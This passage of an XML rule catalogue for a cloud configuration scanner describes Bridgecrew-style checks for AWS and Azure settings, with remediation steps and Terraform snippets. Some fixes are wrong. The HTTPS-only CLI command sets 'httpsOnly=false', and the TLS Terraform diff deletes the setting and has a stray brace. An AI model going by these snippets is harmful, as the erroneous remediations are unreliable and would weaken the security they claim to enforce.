  </rule>
  <rule>
    <key>CKV2_AWS_4</key>
    <name>Ensure API Gateway stage have logging level defined appropriately</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="api-gateway-stage-does-not-have-logging-level-defined-appropriately"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-api-gateway-stage-does-not-have-logging-level-defined-appropriately"></div>API Gateway stage does not have logging level defined appropriately</div><a aria-label="Skip link to API Gateway stage does not have logging level defined appropriately" class="heading-anchor-icon fa fa-anchor" href="#api-gateway-stage-does-not-have-logging-level-defined-appropriately"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resources:</strong> aws_api_gateway_rest_api, aws_api_gateway_deployment, aws_api_gateway_method_settings</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_api_gateway_rest_api" "ok_example" {
  body = jsonencode({
    openapi = "3.0.1"
    info = {
      title   = "ok_example"
      version = "1.0"
    }
    paths = {
      "/path1" = {
        get = {
          x-amazon-apigateway-integration = {
            httpMethod           = "GET"
            payloadFormatVersion = "1.0"
            type                 = "HTTP_PROXY"
            uri                  = "https://ip-ranges.amazonaws.com/ip-ranges.json"
          }
        }
      }
    }
  })

  name = "ok_example"
}

resource "aws_api_gateway_deployment" "ok_example" {
  rest_api_id = aws_api_gateway_rest_api.ok_example.id

  triggers = {
    redeployment = sha1(jsonencode(aws_api_gateway_rest_api.ok_example.body))
  }

  lifecycle {
    create_before_destroy = true
  }
}

resource "aws_api_gateway_stage" "ok_example" {
  deployment_id = aws_api_gateway_deployment.ok_example.id
  rest_api_id   = aws_api_gateway_rest_api.ok_example.id
  stage_name    = "ok_example"
}

resource "aws_api_gateway_method_settings" "all" {
  rest_api_id = aws_api_gateway_rest_api.ok_example.id
  stage_name  = aws_api_gateway_stage.ok_example.stage_name
  method_path = "*/*"

  settings {
    metrics_enabled = true
    logging_level   = "ERROR"
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-api-gateway-stage-have-logging-level-defined-as-appropiate' target='_blank'> https://docs.bridgecrew.io/docs/ensure-api-gateway-stage-have-logging-level-defined-as-appropiate</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-api-gateway-stage-have-logging-level-defined-as-appropiate' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_144</key>
    <name>Ensure S3 bucket has cross-region replication enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="s3-bucket-cross-region-replication-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-s-3-bucket-cross-region-replication-disabled"></div>S3 bucket cross-region replication disabled</div><a aria-label="Skip link to S3 bucket cross-region replication disabled" class="heading-anchor-icon fa fa-anchor" href="#s3-bucket-cross-region-replication-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Cross-region replication enables automatic, asynchronous copying of objects across S3 buckets. By default, replication supports copying new S3 objects after it is enabled. It is also possible to use replication to copy existing objects and clone them to a different bucket, but in order to do so, you must contact AWS Support.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_s3_bucket</li>
<li><strong>Argument:</strong> replication_configuration</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">aws_s3_bucket.test.tf</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="aws_s3_bucket.test.tf">resource "aws_s3_bucket" "test" {
  ...
+  replication_configuration {
+    role = aws_iam_role.replication.arn
+    rules {
+      id     = "foobar"
+      prefix = "foo"
+      status = "Enabled"
+
+      destination {
+        bucket        = aws_s3_bucket.destination.arn
+        storage_class = "STANDARD"
+      }
+    }
+  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-s3-bucket-has-cross-region-replication-enabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-s3-bucket-has-cross-region-replication-enabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-s3-bucket-has-cross-region-replication-enabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_11</key>
    <name>Ensure SQL databases do not allow ingress from 0.0.0.0/0</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="sql-databases-allow-ingress-from-00000"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-sql-databases-allow-ingress-from-0-0-0-0-0"></div>SQL databases allow ingress from 0.0.0.0/0</div><a aria-label="Skip link to SQL databases allow ingress from 0.0.0.0/0" class="heading-anchor-icon fa fa-anchor" href="#sql-databases-allow-ingress-from-00000"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>SQL Server includes a firewall to block access to unauthorized connections. More granular IP addresses can be defined by referencing the range of addresses available from specific datacenters.<br/>
The SQL server default Firewall exists with StartIp of 0.0.0.0 and EndIP of 0.0.0.0, allowing access to all Azure services. A custom rule can be set with StartIp of 0.0.0.0 and EndIP of 255.255.255.255, allowing access from <strong>any</strong> IP over the Internet. To reduce the potential attack surface for a SQL server, firewall rules should be defined with more granular IP addresses. This is achieved by referencing the range of addresses available from specific datacenters.</p>
<p>We recommend SQL Databases do not allow ingress from 0.0.0.0/0, that is, any IP.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>SQL servers</strong>.</li>
<li>For each SQL server:<br/>
a) Click <strong>Firewall / Virtual Networks</strong>.<br/>
b) Set <strong>Allow access to Azure services</strong> to <strong>OFF</strong>.<br/>
c) Set firewall rules to limit access to authorized connections.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To disable default Firewall rule <strong>Allow access to Azure services</strong>, use the following commands:<br/>
<button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Remove-AzureRmSqlServerFirewallRule -FirewallRuleName </code></p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">"AllowAllWindowsAzureIps" 
-ResourceGroupName &lt;resource group name&gt; 
-ServerName &lt;server name&gt;
</code></pre>
<p>To remove a custom Firewall rule, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Remove-AzureRmSqlServerFirewallRule 
-FirewallRuleName "&lt;firewallRuleName&gt;" 
-ResourceGroupName &lt;resource group name&gt; 
-ServerName &lt;server name&gt;
</code></pre>
<p>To set the appropriate firewall rules, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">Set-AzureRmSqlServerFirewallRule 
-ResourceGroupName &lt;resource group name&gt; 
-ServerName &lt;server name&gt; 
-FirewallRuleName "&lt;Fw rule Name&gt;" 
-StartIpAddress "&lt;IP Address other than 0.0.0.0&gt;" 
-EndIpAddress "&lt;IP Address other than0.0.0.0 or 255.255.255.255&gt;"
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resources</strong>:<br/>
azurerm_mariadb_firewall_rule<br/>
azurerm_sql_firewall_rule<br/>
azurerm_postgresql_firewall_rule<br/>
azurerm_mysql_firewall_rule</li>
<li><strong>Argument</strong>: start_ip_address</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_mysql_firewall_rule" "example" {
    ...
-   start_ip_address    = "0.0.0.0"
-   end_ip_address      = "255.255.255.255"
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_networking_4' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_networking_4</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_networking_4' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_14</key>
    <name>Ensure Azure App Service Web app redirects HTTP to HTTPS</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-app-service-web-app-does-not-redirect-http-to-https"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-app-service-web-app-does-not-redirect-http-to-https"></div>Azure App Service Web app does not redirect HTTP to HTTPS</div><a aria-label="Skip link to Azure App Service Web app does not redirect HTTP to HTTPS" class="heading-anchor-icon fa fa-anchor" href="#azure-app-service-web-app-does-not-redirect-http-to-https"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Azure Web Apps by default allows sites to run under both HTTP and HTTPS, and can be accessed by anyone using non-secure HTTP links. Non-secure HTTP requests can be restricted and all HTTP requests redirected to the secure HTTPS port. </p>
<p>We recommend you enforce HTTPS-only traffic to increase security. This will redirect all non-secure HTTP requests to HTTPS ports. HTTPS uses the SSL/TLS protocol to provide a secure connection, which is both encrypted and authenticated. </p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>App Services</strong>.</li>
<li>For each App, click App.<br/>
a) Navigate to the <strong>Setting</strong> section.<br/>
b) Click <strong>SSL settings</strong>.<br/>
c) Navigate to the <strong>Protocol Settings</strong> section.<br/>
d) Set <strong>HTTPS Only</strong> to <strong>On</strong>. </li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set HTTPS-only traffic for an existing app, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az webapp update 
--resource-group &lt;RESOURCE_GROUP_NAME&gt; 
--name &lt;APP_NAME&gt; 
--set httpsOnly=false
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<p><strong>Resource</strong>: azurerm_app_service<br/>
<strong>Argument</strong>: https_only</p>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
    ...
+   https_only          = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_networking_5' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_networking_5</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_networking_5' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_15</key>
    <name>Ensure Web App uses the latest version of TLS encryption</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="web-app-does-not-use-the-latest-version-of-tls-encryption"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-web-app-does-not-use-the-latest-version-of-tls-encryption"></div>Web App does not use the latest version of TLS encryption</div><a aria-label="Skip link to Web App does not use the latest version of TLS encryption" class="heading-anchor-icon fa fa-anchor" href="#web-app-does-not-use-the-latest-version-of-tls-encryption"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>The Transport Layer Security (TLS) protocol secures transmission of data over the internet using standard encryption technology. Encryption should be set with the latest version of TLS. App service allows TLS 1.2 by default, which is the recommended TLS level by industry standards, for example, PCI DSS.</p>
<p>App service currently allows the web app to set TLS versions 1.0, 1.1 and 1.2. For secure web app connections it is highly recommended to only use the latest TLS 1.2 version.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>App Services</strong>.</li>
<li>For each Web App, click <em>App</em>.<br/>
a) Navigate to <strong>Setting </strong>section.<br/>
b) Click <strong>SSL Settings</strong>.<br/>
c)  Navigate to <strong>Protocol Settings </strong>section.<br/>
d) Set <strong>Minimum TLS Version</strong> to <strong>1.2</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set TLS Version for an existing app, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az webapp config set 
--resource-group &lt;RESOURCE_GROUP_NAME&gt; 
--name &lt;APP_NAME&gt;
--min-tls-version 1.2
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_app_service</li>
<li><strong>Argument</strong>: min_tls_version</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
    ...
-   min_tls_version = &lt;version&gt;
    }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_networking_6' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_networking_6</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_networking_6' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_17</key>
    <name>Ensure Web App has incoming client certificates enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-app-service-web-app-client-certificate-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-app-service-web-app-client-certificate-is-disabled"></div>Azure App Service Web app client certificate is disabled</div><a aria-label="Skip link to Azure App Service Web app client certificate is disabled" class="heading-anchor-icon fa fa-anchor" href="#azure-app-service-web-app-client-certificate-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Client certificates allow the Web App to require a certificate for incoming requests. Only clients that have a valid certificate will be able to reach the app.</p>
<p>The TLS mutual authentication technique in enterprise environments ensures the authenticity of clients to the server. If incoming client certificates are enabled only an authenticated client with valid certificates can access the app.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-portal"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-portal"></div>Azure Portal</div><a aria-label="Skip link to Azure Portal" class="heading-anchor-icon fa fa-anchor" href="#azure-portal"></a></h2>
<p>To change the policy using the Azure Portal, follow these steps:</p>
<ol>
<li>Log in to the Azure Portal at <a href="https://portal.azure.com" target="_self">https://portal.azure.com</a>.</li>
<li>Navigate to <strong>App Services</strong>.</li>
<li>For each Web App, click<em> App</em>.<br/>
a) Navigate to <strong>Setting </strong>section.<br/>
b) Click <strong>SSL Settings</strong>.<br/>
c)  Navigate to <strong>Protocol Settings </strong>section.<br/>
d) Set <strong>Incoming client certificates</strong> to <strong>On</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To set Incoming client certificates value for an existing app, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang- theme-light" data-lang="" name="">az webapp update 
--resource-group &lt;RESOURCE_GROUP_NAME&gt; 
--name &lt;APP_NAME&gt;
--set clientCertEnabled=true
</code></pre>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource</strong>: azurerm_app_service</li>
<li><strong>Argument</strong>: client_cert_enabled</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
    ...
+   client_cert_enabled          = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/bc_azr_networking_7' target='_blank'> https://docs.bridgecrew.io/docs/bc_azr_networking_7</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/bc_azr_networking_7' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_1</key>
    <name>Ensure storage for critical data are encrypted with CMKs</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="storage-for-critical-data-are-not-encrypted-with-customer-managed-key"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-storage-for-critical-data-are-not-encrypted-with-customer-managed-key"></div>Storage for critical data are not encrypted with Customer Managed Key </div><a aria-label="Skip link to Storage for critical data are not encrypted with Customer Managed Key " class="heading-anchor-icon fa fa-anchor" href="#storage-for-critical-data-are-not-encrypted-with-customer-managed-key"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable sensitive data encryption at rest using Customer Managed Keys (CMKs) rather than Microsoft Managed keys. By default, data in the storage account is encrypted using Microsoft Managed Keys at rest. All Azure Storage resources are encrypted, including blobs, disks, files, queues, and tables. All object metadata is also encrypted. However, if you want to control and manage this encryption key yourself, you can specify a customer-managed key, that key is used to protect and control access to the key that encrypts your data. You can also choose to automatically update the key version used for Azure Storage encryption whenever a new version is available in the associated Key Vault.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_resource_group, azurerm_key_vault, azurerm_key_vault_access_policy, azurerm_key_vault_key, azurerm_storage_account, azurerm_storage_account_customer_managed_key</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">data "azurerm_client_config" "current" {}

resource "azurerm_resource_group" "example" {
  name     = "example-resources"
  location = "West Europe"
}

resource "azurerm_key_vault" "example" {
  name                = "examplekv"
  location            = azurerm_resource_group.example.location
  resource_group_name = azurerm_resource_group.example.name
  tenant_id           = data.azurerm_client_config.current.tenant_id
  sku_name            = "standard"

  purge_protection_enabled = true
}

resource "azurerm_key_vault_access_policy" "client" {
  key_vault_id = azurerm_key_vault.example.id
  tenant_id    = data.azurerm_client_config.current.tenant_id
  object_id    = data.azurerm_client_config.current.object_id

  key_permissions    = ["get", "create", "delete", "list", "restore", "recover", "unwrapkey", "wrapkey", "purge", "encrypt", "decrypt", "sign", "verify"]
  secret_permissions = ["get"]
}

resource "azurerm_key_vault_key" "example" {
  name         = "tfex-key"
  key_vault_id = azurerm_key_vault.example.id
  key_type     = "RSA"
  key_size     = 2048
  key_opts     = ["decrypt", "encrypt", "sign", "unwrapKey", "verify", "wrapKey"]

  depends_on = [
    azurerm_key_vault_access_policy.client
  ]
}


resource "azurerm_storage_account" "ok_storage_account" {
  name                     = "examplestor"
  resource_group_name      = azurerm_resource_group.example.name
  location                 = azurerm_resource_group.example.location
  account_tier             = "Standard"
  account_replication_type = "GRS"

  identity {
    type = "SystemAssigned"
  }
}


resource "azurerm_storage_account_customer_managed_key" "ok_cmk" {
  storage_account_id = azurerm_storage_account.ok_storage_account.id
  key_vault_id       = azurerm_key_vault.example.id
  key_name           = azurerm_key_vault_key.example.name
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-storage-for-critical-data-are-encrypted-with-customer-managed-key' target='_blank'> https://docs.bridgecrew.io/docs/ensure-storage-for-critical-data-are-encrypted-with-customer-managed-key</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
